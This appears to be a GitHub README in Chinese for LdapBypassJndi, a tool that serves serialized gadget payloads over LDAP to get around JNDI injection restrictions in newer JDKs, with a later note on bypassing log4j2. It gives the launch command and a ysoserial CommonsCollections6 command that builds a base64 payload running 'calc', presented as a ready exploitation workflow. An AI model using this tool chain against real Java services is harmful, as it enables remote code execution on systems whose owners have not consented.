# LdapBypassJndi

>该工具功能是通过LDAP去绕过高版本的JNDI注入

原理：利用LDAP返回序列化数据，触发本地Gadget

使用：**java -jar LdapBypassJndi.jar port poc.ser**

port：是监听的端口相当于服务端监听的端口

poc.ser：是序列化base64编码的gadget

```
java -jar ysoserial.jar CommonsCollections6 "calc" | base64 >win-cc6-calc-poc.ser
```

![poc](img/poc.gif)

简单的说相当于一个反序列化入口，要利用就需要本地有。


**更新 2021/12/21**

bypass log4j2 的ldap服务

https://github.com/Firebasky/Java/blob/main/java%E6%97%A5%E5%B8%B8/%E9%97%B2%E8%B0%88log4j2.md

>参考：
>
>https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html
>
>https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/
